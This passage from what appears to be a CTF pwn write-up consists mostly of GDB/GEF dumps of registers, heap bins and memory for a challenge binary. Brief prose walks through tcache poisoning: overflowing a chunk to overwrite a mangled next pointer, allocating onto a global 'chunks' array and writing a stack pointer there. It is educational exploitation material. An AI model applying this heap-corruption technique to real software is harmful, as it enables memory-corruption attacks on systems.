$rsp   : 0x00007fff800c03b8  →  0x00007f7305c7a071  →  <__GI__IO_file_underflow+353> test rax, rax
$rbp   : 0x00007f7305dcb430  →  0x0000000000000000
$rsi   : 0x000055a27cdee6b0  →  "7\n1\n\n"
$rdi   : 0x0             
$rip   : 0x00007f7305cf4951  →  0x5777fffff0003d48 ("H="?)
$r8 : 0x0            
$r9 : 0x0            
$r10   : 0x5d4d44ec5f98a8c6
$r11   : 0x246           
$r12   : 0x00007f7305e2cac0  →  0x00000000fbad2088
$r13   : 0x00007f7305dcb2e0  →  0x0000000000000000
$r14   : 0x00007fff800c04a0  →  0x0000000000000000
$r15   : 0x12            
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fff800c03b8│+0x0000: 0x00007f7305c7a071  →  <__GI__IO_file_underflow+353> test rax, rax   ← $rsp
0x00007fff800c03c0│+0x0008: 0x00007f7305e2cac0  →  0x00000000fbad2088
0x00007fff800c03c8│+0x0010: 0x00007f7305dcb430  →  0x0000000000000000
0x00007fff800c03d0│+0x0018: 0x00007f7305e2cac0  →  0x00000000fbad2088
0x00007fff800c03d8│+0x0020: 0x000055a27cdee6b2  →  0x00000000000a0a31 ("1\n\n"?)
0x00007fff800c03e0│+0x0028: 0x00007fff800c04a0  →  0x0000000000000000
0x00007fff800c03e8│+0x0030: 0x00007f7305c7c23f  →  <_IO_default_uflow+47> cmp eax, 0xffffffff
0x00007fff800c03f0│+0x0038: 0x000055a27cdee2a0  →  "Please enter menu choice:\nnk\n2.) View Chunk\n3.)[...]"
──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x7f7305cf494b <read+11>     je  0x7f7305cf4960 <__GI___libc_read+32>
   0x7f7305cf494d <read+13>     xor eax, eax
   0x7f7305cf494f <read+15>     syscall
 → 0x7f7305cf4951 <read+17>     cmp rax, 0xfffffffffffff000
   0x7f7305cf4957 <read+23>     ja  0x7f7305cf49b0 <__GI___libc_read+112>
   0x7f7305cf4959 <read+25>     ret    
   0x7f7305cf495a <read+26>     nop WORD PTR [rax+rax*1+0x0]
   0x7f7305cf4960 <read+32>     sub rsp, 0x28
   0x7f7305cf4964 <read+36>     mov QWORD PTR [rsp+0x18], rdx
─────────────────────────────────────────────────────────────── source:../sysdeps/unix[...].c+26 ────
    21  
    22  /* Read NBYTES into BUF from FD.  Return the number read or -1.  */
    23  ssize_t
    24  __libc_read (int fd, void *buf, size_t nbytes)
    25  {
 →   26 return SYSCALL_CANCEL (read, fd, buf, nbytes);
    27  }
    28  libc_hidden_def (__libc_read)
    29  
    30  libc_hidden_def (__read)
    31  weak_alias (__libc_read, __read)
──────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "chall-01", stopped 0x7f7305cf4951 in __GI___libc_read (), reason: SIGINT
────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x7f7305cf4951 → __GI___libc_read(fd=0x0, buf=0x55a27cdee6b0, nbytes=0x1000)
[#1] 0x7f7305c7a071 → _IO_new_file_underflow(fp=0x7f7305e2cac0 <_IO_2_1_stdin_>)
[#2] 0x7f7305c7c23f → __GI__IO_default_uflow(fp=0x7f7305e2cac0 <_IO_2_1_stdin_>)
[#3] 0x7f7305c6f52c → __GI__IO_getline_info(fp=0x7f7305e2cac0 <_IO_2_1_stdin_>, buf=0x7fff800c04a0 "", n=0x12, delim=0xa, extract_delim=0x1, eof=0x0)
[#4] 0x7f7305c6f62c → __GI__IO_getline(fp=0x7f7305e2cac0 <_IO_2_1_stdin_>, buf=0x7fff800c04a0 "", n=0x12, delim=0xa, extract_delim=0x1)
[#5] 0x7f7305c6e2ee → _IO_fgets(buf=0x7fff800c04a0 "", n=0x13, fp=0x7f7305e2cac0 <_IO_2_1_stdin_>)
[#6] 0x55a27b962337 → get_uint()
[#7] 0x55a27b96225d → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  heap bins
────────────────────────────────────── Tcachebins for thread 1 ──────────────────────────────────────
Tcachebins[idx=7, size=0x90, count=3] ←  Chunk(addr=0x55a27cdf0260, size=0x90, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x55a27cdf02f0, size=0x90, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x55a27cdf0380, size=0x90, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
─────────────────────────────── Fastbins for arena at 0x7f7305e2cca0 ───────────────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
───────────────────────────── Unsorted Bin for arena at 0x7f7305e2cca0 ─────────────────────────────
[+] unsorted_bins[0]: fw=0x55a27cdf0400, bk=0x55a27cdf0400
 →   Chunk(addr=0x55a27cdf0410, size=0x330, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
[+] Found 1 chunks in unsorted bin.
────────────────────────────── Small Bins for arena at 0x7f7305e2cca0 ──────────────────────────────
[+] Found 0 chunks in 0 small non-empty bins.
────────────────────────────── Large Bins for arena at 0x7f7305e2cca0 ──────────────────────────────
[+] large_bins[69]: fw=0x55a27cdefbf0, bk=0x55a27cdefbf0
 →   Chunk(addr=0x55a27cdefc00, size=0x5a0, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
[+] Found 1 chunks in 1 large non-empty bins.
gef➤  x/100g 0x55a27cdf0220
0x55a27cdf0220: 0x0 0x31
0x55a27cdf0230: 0x7f7305e2d130  0x7f7305e2d130
0x55a27cdf0240: 0x55a27cdf0220  0x55a27cdf0220
0x55a27cdf0250: 0x0 0x91
0x55a27cdf0260: 0x55a726f8cf00  0x5d4d44ec5f98a8c6
0x55a27cdf0270: 0x0 0x0
0x55a27cdf0280: 0x0 0x0
0x55a27cdf0290: 0x0 0x0
0x55a27cdf02a0: 0x0 0x0
0x55a27cdf02b0: 0x0 0x0
0x55a27cdf02c0: 0x0 0x0
0x55a27cdf02d0: 0x0 0x0
0x55a27cdf02e0: 0x0 0x91
0x55a27cdf02f0: 0x55a726f8ce70  0x5d4d44ec5f98a8c6
0x55a27cdf0300: 0x0 0x0
0x55a27cdf0310: 0x0 0x0
0x55a27cdf0320: 0x0 0x0
0x55a27cdf0330: 0x0 0x0
0x55a27cdf0340: 0x0 0x0
0x55a27cdf0350: 0x0 0x0
0x55a27cdf0360: 0x0 0x0
0x55a27cdf0370: 0x0 0x91
0x55a27cdf0380: 0x55a27cdf0 0x5d4d44ec5f98a8c6
0x55a27cdf0390: 0x0 0x0
0x55a27cdf03a0: 0x0 0x0
0x55a27cdf03b0: 0x0 0x0
0x55a27cdf03c0: 0x0 0x0
0x55a27cdf03d0: 0x0 0x0
0x55a27cdf03e0: 0x0 0x0
0x55a27cdf03f0: 0x0 0x0
0x55a27cdf0400: 0x0 0x331
0x55a27cdf0410: 0x7f7305e2cd00  0x7f7305e2cd00
0x55a27cdf0420: 0x0 0x0
0x55a27cdf0430: 0x0 0x0
0x55a27cdf0440: 0x0 0x0
0x55a27cdf0450: 0x0 0x0
0x55a27cdf0460: 0x0 0x0
0x55a27cdf0470: 0x0 0x0
0x55a27cdf0480: 0x0 0x0
0x55a27cdf0490: 0x0 0x0
0x55a27cdf04a0: 0x0 0x0
0x55a27cdf04b0: 0x0 0x0
0x55a27cdf04c0: 0x0 0x0
0x55a27cdf04d0: 0x0 0x0
0x55a27cdf04e0: 0x0 0x0
0x55a27cdf04f0: 0x0 0x0
0x55a27cdf0500: 0x0 0x0
0x55a27cdf0510: 0x0 0x0
0x55a27cdf0520: 0x0 0x0
0x55a27cdf0530: 0x0 0x0
gef➤  c
Continuing.
```

So we see that our three chunks (`0x55a27cdf0250/0x55a27cdf02e0/0x55a27cdf0370`) have been inserted into the tcache. Now let's use the `0x55a27cdf0220` chunk to overflow the tcache bin head `0x55a27cdf0250`. This will be so we can allocate a ptr to `chunks`:

```
^C
Program received signal SIGINT, Interrupt.
0x00007f7305cf4951 in __GI___libc_read (fd=0x0, buf=0x55a27cdee6b0, nbytes=0x1000) at ../sysdeps/unix/sysv/linux/read.c:26
26  return SYSCALL_CANCEL (read, fd, buf, nbytes);

[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0xfffffffffffffe00
$rbx   : 0x00007f7305e2cac0  →  0x00000000fbad2088
$rcx   : 0x00007f7305cf4951  →  0x5777fffff0003d48 ("H="?)
$rdx   : 0x1000          
$rsp   : 0x00007fff800c03b8  →  0x00007f7305c7a071  →  <__GI__IO_file_underflow+353> test rax, rax
$rbp   : 0x00007f7305dcb430  →  0x0000000000000000
$rsi   : 0x000055a27cdee6b0  →  "\n\n\n\n\n"
$rdi   : 0x0             
$rip   : 0x00007f7305cf4951  →  0x5777fffff0003d48 ("H="?)
$r8 : 0x0            
$r9 : 0x0            
$r10   : 0x00007fff800c0287  →  0x007f7305c4f2b200
$r11   : 0x246           
$r12   : 0x00007f7305e2cac0  →  0x00000000fbad2088
$r13   : 0x00007f7305dcb2e0  →  0x0000000000000000
$r14   : 0x00007fff800c04a0  →  0x0000000000000000
$r15   : 0x12            
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fff800c03b8│+0x0000: 0x00007f7305c7a071  →  <__GI__IO_file_underflow+353> test rax, rax   ← $rsp
0x00007fff800c03c0│+0x0008: 0x00007f7305e2cac0  →  0x00000000fbad2088
0x00007fff800c03c8│+0x0010: 0x00007f7305dcb430  →  0x0000000000000000
0x00007fff800c03d0│+0x0018: 0x00007f7305e2cac0  →  0x00000000fbad2088
0x00007fff800c03d8│+0x0020: 0x000055a27cdee6b1  →  "\n\n\n\n"
0x00007fff800c03e0│+0x0028: 0x00007fff800c04a0  →  0x0000000000000000
0x00007fff800c03e8│+0x0030: 0x00007f7305c7c23f  →  <_IO_default_uflow+47> cmp eax, 0xffffffff
0x00007fff800c03f0│+0x0038: 0x000055a27cdee2a0  →  "Please enter menu choice:\nnk\n2.) View Chunk\n3.)[...]"
──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x7f7305cf494b <read+11>     je  0x7f7305cf4960 <__GI___libc_read+32>
   0x7f7305cf494d <read+13>     xor eax, eax
   0x7f7305cf494f <read+15>     syscall
 → 0x7f7305cf4951 <read+17>     cmp rax, 0xfffffffffffff000
   0x7f7305cf4957 <read+23>     ja  0x7f7305cf49b0 <__GI___libc_read+112>
   0x7f7305cf4959 <read+25>     ret    
   0x7f7305cf495a <read+26>     nop WORD PTR [rax+rax*1+0x0]
   0x7f7305cf4960 <read+32>     sub rsp, 0x28
   0x7f7305cf4964 <read+36>     mov QWORD PTR [rsp+0x18], rdx
─────────────────────────────────────────────────────────────── source:../sysdeps/unix[...].c+26 ────
    21  
    22  /* Read NBYTES into BUF from FD.  Return the number read or -1.  */
    23  ssize_t
    24  __libc_read (int fd, void *buf, size_t nbytes)
    25  {
 →   26 return SYSCALL_CANCEL (read, fd, buf, nbytes);
    27  }
    28  libc_hidden_def (__libc_read)
    29  
    30  libc_hidden_def (__read)
    31  weak_alias (__libc_read, __read)
──────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "chall-01", stopped 0x7f7305cf4951 in __GI___libc_read (), reason: SIGINT
────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x7f7305cf4951 → __GI___libc_read(fd=0x0, buf=0x55a27cdee6b0, nbytes=0x1000)
[#1] 0x7f7305c7a071 → _IO_new_file_underflow(fp=0x7f7305e2cac0 <_IO_2_1_stdin_>)
[#2] 0x7f7305c7c23f → __GI__IO_default_uflow(fp=0x7f7305e2cac0 <_IO_2_1_stdin_>)
[#3] 0x7f7305c6f52c → __GI__IO_getline_info(fp=0x7f7305e2cac0 <_IO_2_1_stdin_>, buf=0x7fff800c04a0 "", n=0x12, delim=0xa, extract_delim=0x1, eof=0x0)
[#4] 0x7f7305c6f62c → __GI__IO_getline(fp=0x7f7305e2cac0 <_IO_2_1_stdin_>, buf=0x7fff800c04a0 "", n=0x12, delim=0xa, extract_delim=0x1)
[#5] 0x7f7305c6e2ee → _IO_fgets(buf=0x7fff800c04a0 "", n=0x13, fp=0x7f7305e2cac0 <_IO_2_1_stdin_>)
[#6] 0x55a27b962337 → get_uint()
[#7] 0x55a27b96225d → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  heap bins
────────────────────────────────────── Tcachebins for thread 1 ──────────────────────────────────────
Tcachebins[idx=7, size=0x90, count=2] ←  Chunk(addr=0x55a27cdf0260, size=0x90, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x55a27b965040, size=0x0, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  [Corrupted chunk at 0x55a27b965040]
─────────────────────────────── Fastbins for arena at 0x7f7305e2cca0 ───────────────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
───────────────────────────── Unsorted Bin for arena at 0x7f7305e2cca0 ─────────────────────────────
[+] unsorted_bins[0]: fw=0x55a27cdf0400, bk=0x55a27cdf0400
 →   Chunk(addr=0x55a27cdf0410, size=0x330, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
[+] Found 1 chunks in unsorted bin.
────────────────────────────── Small Bins for arena at 0x7f7305e2cca0 ──────────────────────────────
[+] Found 0 chunks in 0 small non-empty bins.
────────────────────────────── Large Bins for arena at 0x7f7305e2cca0 ──────────────────────────────
[+] large_bins[69]: fw=0x55a27cdefbf0, bk=0x55a27cdefbf0
 →   Chunk(addr=0x55a27cdefc00, size=0x5a0, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
[+] Found 1 chunks in 1 large non-empty bins.
gef➤  x/100g 0x55a27cdf0220
0x55a27cdf0220: 0x0 0x31
0x55a27cdf0230: 0x3030303030303030  0x3030303030303030
0x55a27cdf0240: 0x3030303030303030  0x3030303030303030
0x55a27cdf0250: 0x0 0x91
0x55a27cdf0260: 0x55a721b19db0  0x5d4d44ec5f98a8c6
0x55a27cdf0270: 0x0 0x0
0x55a27cdf0280: 0x0 0x0
0x55a27cdf0290: 0x0 0x0
0x55a27cdf02a0: 0x0 0x0
0x55a27cdf02b0: 0x0 0x0
0x55a27cdf02c0: 0x0 0x0
0x55a27cdf02d0: 0x0 0x0
0x55a27cdf02e0: 0x0 0x91
0x55a27cdf02f0: 0x55a726f8ce70  0x5d4d44ec5f98a8c6
0x55a27cdf0300: 0x0 0x0
0x55a27cdf0310: 0x0 0x0
0x55a27cdf0320: 0x0 0x0
0x55a27cdf0330: 0x0 0x0
0x55a27cdf0340: 0x0 0x0
0x55a27cdf0350: 0x0 0x0
0x55a27cdf0360: 0x0 0x0
0x55a27cdf0370: 0x0 0x91
0x55a27cdf0380: 0x55a27cdf0 0x5d4d44ec5f98a8c6
0x55a27cdf0390: 0x0 0x0
0x55a27cdf03a0: 0x0 0x0
0x55a27cdf03b0: 0x0 0x0
0x55a27cdf03c0: 0x0 0x0
0x55a27cdf03d0: 0x0 0x0
0x55a27cdf03e0: 0x0 0x0
0x55a27cdf03f0: 0x0 0x0
0x55a27cdf0400: 0x0 0x331
0x55a27cdf0410: 0x7f7305e2cd00  0x7f7305e2cd00
0x55a27cdf0420: 0x0 0x0
0x55a27cdf0430: 0x0 0x0
0x55a27cdf0440: 0x0 0x0
0x55a27cdf0450: 0x0 0x0
0x55a27cdf0460: 0x0 0x0
0x55a27cdf0470: 0x0 0x0
0x55a27cdf0480: 0x0 0x0
0x55a27cdf0490: 0x0 0x0
0x55a27cdf04a0: 0x0 0x0
0x55a27cdf04b0: 0x0 0x0
0x55a27cdf04c0: 0x0 0x0
0x55a27cdf04d0: 0x0 0x0
0x55a27cdf04e0: 0x0 0x0
0x55a27cdf04f0: 0x0 0x0
0x55a27cdf0500: 0x0 0x0
0x55a27cdf0510: 0x0 0x0
0x55a27cdf0520: 0x0 0x0
0x55a27cdf0530: 0x0 0x0
gef➤  c
Continuing.
```

So we see here that the next ptr at `0x55a27cdf0260` has been overwritten, to be the mangled next ptr to `chunks`. With the next allocation, it should be the new tcache bin head. After that, we should see that we have allocated a chunk to `chunks`, which we see here:

```
^C
Program received signal SIGINT, Interrupt.
0x00007f7305cf4951 in __GI___libc_read (fd=0x0, buf=0x55a27cdee6b0, nbytes=0x1000) at ../sysdeps/unix/sysv/linux/read.c:26
26  return SYSCALL_CANCEL (read, fd, buf, nbytes);

[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0xfffffffffffffe00
$rbx   : 0x00007f7305e2cac0  →  0x00000000fbad2088
$rcx   : 0x00007f7305cf4951  →  0x5777fffff0003d48 ("H="?)
$rdx   : 0x1000          
$rsp   : 0x00007fff800c03b8  →  0x00007f7305c7a071  →  <__GI__IO_file_underflow+353> test rax, rax
$rbp   : 0x00007f7305dcb430  →  0x0000000000000000
$rsi   : 0x000055a27cdee6b0  →  "8\n8\n\n"
$rdi   : 0x0             
$rip   : 0x00007f7305cf4951  →  0x5777fffff0003d48 ("H="?)
$r8 : 0x0            
$r9 : 0x0            
$r10   : 0x00007fff800c0267  →  0x007f7305c4f2b200
$r11   : 0x246           
$r12   : 0x00007f7305e2cac0  →  0x00000000fbad2088
$r13   : 0x00007f7305dcb2e0  →  0x0000000000000000
$r14   : 0x00007fff800c04a0  →  0x0000000000000000
$r15   : 0x12            
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fff800c03b8│+0x0000: 0x00007f7305c7a071  →  <__GI__IO_file_underflow+353> test rax, rax   ← $rsp
0x00007fff800c03c0│+0x0008: 0x00007f7305e2cac0  →  0x00000000fbad2088
0x00007fff800c03c8│+0x0010: 0x00007f7305dcb430  →  0x0000000000000000
0x00007fff800c03d0│+0x0018: 0x00007f7305e2cac0  →  0x00000000fbad2088
0x00007fff800c03d8│+0x0020: 0x000055a27cdee6b2  →  0x00000000000a0a38 ("8\n\n"?)
0x00007fff800c03e0│+0x0028: 0x00007fff800c04a0  →  0x0000000000000000
0x00007fff800c03e8│+0x0030: 0x00007f7305c7c23f  →  <_IO_default_uflow+47> cmp eax, 0xffffffff
0x00007fff800c03f0│+0x0038: 0x000055a27cdee2a0  →  "Please enter menu choice:\nnk\n2.) View Chunk\n3.)[...]"
──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x7f7305cf494b <read+11>     je  0x7f7305cf4960 <__GI___libc_read+32>
   0x7f7305cf494d <read+13>     xor eax, eax
   0x7f7305cf494f <read+15>     syscall
 → 0x7f7305cf4951 <read+17>     cmp rax, 0xfffffffffffff000
   0x7f7305cf4957 <read+23>     ja  0x7f7305cf49b0 <__GI___libc_read+112>
   0x7f7305cf4959 <read+25>     ret    
   0x7f7305cf495a <read+26>     nop WORD PTR [rax+rax*1+0x0]
   0x7f7305cf4960 <read+32>     sub rsp, 0x28
   0x7f7305cf4964 <read+36>     mov QWORD PTR [rsp+0x18], rdx
─────────────────────────────────────────────────────────────── source:../sysdeps/unix[...].c+26 ────
    21  
    22  /* Read NBYTES into BUF from FD.  Return the number read or -1.  */
    23  ssize_t
    24  __libc_read (int fd, void *buf, size_t nbytes)
    25  {
 →   26 return SYSCALL_CANCEL (read, fd, buf, nbytes);
    27  }
    28  libc_hidden_def (__libc_read)
    29  
    30  libc_hidden_def (__read)
    31  weak_alias (__libc_read, __read)
──────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "chall-01", stopped 0x7f7305cf4951 in __GI___libc_read (), reason: SIGINT
────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x7f7305cf4951 → __GI___libc_read(fd=0x0, buf=0x55a27cdee6b0, nbytes=0x1000)
[#1] 0x7f7305c7a071 → _IO_new_file_underflow(fp=0x7f7305e2cac0 <_IO_2_1_stdin_>)
[#2] 0x7f7305c7c23f → __GI__IO_default_uflow(fp=0x7f7305e2cac0 <_IO_2_1_stdin_>)
[#3] 0x7f7305c6f52c → __GI__IO_getline_info(fp=0x7f7305e2cac0 <_IO_2_1_stdin_>, buf=0x7fff800c04a0 "", n=0x12, delim=0xa, extract_delim=0x1, eof=0x0)
[#4] 0x7f7305c6f62c → __GI__IO_getline(fp=0x7f7305e2cac0 <_IO_2_1_stdin_>, buf=0x7fff800c04a0 "", n=0x12, delim=0xa, extract_delim=0x1)
[#5] 0x7f7305c6e2ee → _IO_fgets(buf=0x7fff800c04a0 "", n=0x13, fp=0x7f7305e2cac0 <_IO_2_1_stdin_>)
[#6] 0x55a27b962337 → get_uint()
[#7] 0x55a27b96225d → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  heap bins
────────────────────────────────────── Tcachebins for thread 1 ──────────────────────────────────────
[!] Command 'heap bins tcache' failed to execute properly, reason: Cannot access memory at address 0x55a726f94f95
─────────────────────────────── Fastbins for arena at 0x7f7305e2cca0 ───────────────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
───────────────────────────── Unsorted Bin for arena at 0x7f7305e2cca0 ─────────────────────────────
[+] unsorted_bins[0]: fw=0x55a27cdf0400, bk=0x55a27cdf0400
 →   Chunk(addr=0x55a27cdf0410, size=0x330, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
[+] Found 1 chunks in unsorted bin.
────────────────────────────── Small Bins for arena at 0x7f7305e2cca0 ──────────────────────────────
[+] Found 0 chunks in 0 small non-empty bins.
────────────────────────────── Large Bins for arena at 0x7f7305e2cca0 ──────────────────────────────
[+] large_bins[69]: fw=0x55a27cdefbf0, bk=0x55a27cdefbf0
 →   Chunk(addr=0x55a27cdefc00, size=0x5a0, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
[+] Found 1 chunks in 1 large non-empty bins.
gef➤  x/10g 0x55a27b965040
0x55a27b965040 <chunks>:    0x55a27cdef6c0  0x0
0x55a27b965050 <chunks+16>: 0x55a27cdefc00  0x0
0x55a27b965060 <chunks+32>: 0x55a27cdf01a0  0x55a27cdf0230
0x55a27b965070 <chunks+48>: 0x55a27cdf0740  0x0
0x55a27b965080 <chunks+64>: 0x55a27b965040  0x55a27cdf0260
gef➤  c
Continuing.
```

So we see, we have allocated a ptr to `chunks` (`0x55a27b965040`). Now let's use it to write a stack ptr to offset `0` in `chunks`:

```
^C
Program received signal SIGINT, Interrupt.
0x00007f7305cf4951 in __GI___libc_read (fd=0x0, buf=0x55a27cdee6b0, nbytes=0x1000) at ../sysdeps/unix/sysv/linux/read.c:26
26  return SYSCALL_CANCEL (read, fd, buf, nbytes);

[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0xfffffffffffffe00
$rbx   : 0x00007f7305e2cac0  →  0x00000000fbad2088
$rcx   : 0x00007f7305cf4951  →  0x5777fffff0003d48 ("H="?)
$rdx   : 0x1000          
$rsp   : 0x00007fff800c03b8  →  0x00007f7305c7a071  →  <__GI__IO_file_underflow+353> test rax, rax
$rbp   : 0x00007f7305dcb430  →  0x0000000000000000
$rsi   : 0x000055a27cdee6b0  →  "\n\n8\n\n"
$rdi   : 0x0             
$rip   : 0x00007f7305cf4951  →  0x5777fffff0003d48 ("H="?)
$r8 : 0x0            
$r9 : 0x0            
$r10   : 0x00007fff800c0287  →  0x007f7305c4f2b200
$r11   : 0x246           
$r12   : 0x00007f7305e2cac0  →  0x00000000fbad2088
$r13   : 0x00007f7305dcb2e0  →  0x0000000000000000
$r14   : 0x00007fff800c04a0  →  0x0000000000000000
$r15   : 0x12            
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fff800c03b8│+0x0000: 0x00007f7305c7a071  →  <__GI__IO_file_underflow+353> test rax, rax   ← $rsp
0x00007fff800c03c0│+0x0008: 0x00007f7305e2cac0  →  0x00000000fbad2088
0x00007fff800c03c8│+0x0010: 0x00007f7305dcb430  →  0x0000000000000000
0x00007fff800c03d0│+0x0018: 0x00007f7305e2cac0  →  0x00000000fbad2088
0x00007fff800c03d8│+0x0020: 0x000055a27cdee6b1  →  0x000000000a0a380a ("\n8\n\n"?)
0x00007fff800c03e0│+0x0028: 0x00007fff800c04a0  →  0x0000000000000000
0x00007fff800c03e8│+0x0030: 0x00007f7305c7c23f  →  <_IO_default_uflow+47> cmp eax, 0xffffffff
0x00007fff800c03f0│+0x0038: 0x000055a27cdee2a0  →  "Please enter menu choice:\nnk\n2.) View Chunk\n3.)[...]"
──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x7f7305cf494b <read+11>     je  0x7f7305cf4960 <__GI___libc_read+32>
   0x7f7305cf494d <read+13>     xor eax, eax
   0x7f7305cf494f <read+15>     syscall
 → 0x7f7305cf4951 <read+17>     cmp rax, 0xfffffffffffff000
   0x7f7305cf4957 <read+23>     ja  0x7f7305cf49b0 <__GI___libc_read+112>
   0x7f7305cf4959 <read+25>     ret    
   0x7f7305cf495a <read+26>     nop WORD PTR [rax+rax*1+0x0]
   0x7f7305cf4960 <read+32>     sub rsp, 0x28
   0x7f7305cf4964 <read+36>     mov QWORD PTR [rsp+0x18], rdx
─────────────────────────────────────────────────────────────── source:../sysdeps/unix[...].c+26 ────
    21  
    22  /* Read NBYTES into BUF from FD.  Return the number read or -1.  */
    23  ssize_t
    24  __libc_read (int fd, void *buf, size_t nbytes)
    25  {
 →   26 return SYSCALL_CANCEL (read, fd, buf, nbytes);
    27  }
    28  libc_hidden_def (__libc_read)
    29  
    30  libc_hidden_def (__read)
    31  weak_alias (__libc_read, __read)
──────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "chall-01", stopped 0x7f7305cf4951 in __GI___libc_read (), reason: SIGINT
────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x7f7305cf4951 → __GI___libc_read(fd=0x0, buf=0x55a27cdee6b0, nbytes=0x1000)
[#1] 0x7f7305c7a071 → _IO_new_file_underflow(fp=0x7f7305e2cac0 <_IO_2_1_stdin_>)
[#2] 0x7f7305c7c23f → __GI__IO_default_uflow(fp=0x7f7305e2cac0 <_IO_2_1_stdin_>)
[#3] 0x7f7305c6f52c → __GI__IO_getline_info(fp=0x7f7305e2cac0 <_IO_2_1_stdin_>, buf=0x7fff800c04a0 "", n=0x12, delim=0xa, extract_delim=0x1, eof=0x0)
[#4] 0x7f7305c6f62c → __GI__IO_getline(fp=0x7f7305e2cac0 <_IO_2_1_stdin_>, buf=0x7fff800c04a0 "", n=0x12, delim=0xa, extract_delim=0x1)
[#5] 0x7f7305c6e2ee → _IO_fgets(buf=0x7fff800c04a0 "", n=0x13, fp=0x7f7305e2cac0 <_IO_2_1_stdin_>)
[#6] 0x55a27b962337 → get_uint()
[#7] 0x55a27b96225d → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  x/10g 0x55a27b965040
0x55a27b965040 <chunks>:    0x7fff800c04c8  0x0
0x55a27b965050 <chunks+16>: 0x55a27cdefc00  0x0
0x55a27b965060 <chunks+32>: 0x55a27cdf01a0  0x55a27cdf0230
0x55a27b965070 <chunks+48>: 0x55a27cdf0740  0x0
0x55a27b965080 <chunks+64>: 0x55a27b965040  0x55a27cdf0260
gef➤  vmmap 0x7fff800c04c8
[ Legend:  Code | Heap | Stack ]
Start           End             Offset          Perm Path
0x00007fff800a1000 0x00007fff800c2000 0x0000000000000000 rw- [stack]
gef➤  disas edit_chunk
Dump of assembler code for function edit_chunk:
   0x000055a27b96259d <+0>: endbr64
   0x000055a27b9625a1 <+4>: push   rbp
   0x000055a27b9625a2 <+5>: mov rbp,rsp
   0x000055a27b9625a5 <+8>: sub rsp,0x10
   0x000055a27b9625a9 <+12>:    lea rax,[rip+0xca3]     # 0x55a27b963253
   0x000055a27b9625b0 <+19>:    mov rdi,rax
   0x000055a27b9625b3 <+22>:    call   0x55a27b9620d0 <puts@plt>
   0x000055a27b9625b8 <+27>:    mov edx,0xff0
   0x000055a27b9625bd <+32>:    mov esi,0x0
   0x000055a27b9625c2 <+37>:    lea rax,[rip+0xc9f]     # 0x55a27b963268
   0x000055a27b9625c9 <+44>:    mov rdi,rax
   0x000055a27b9625cc <+47>:    mov eax,0x0
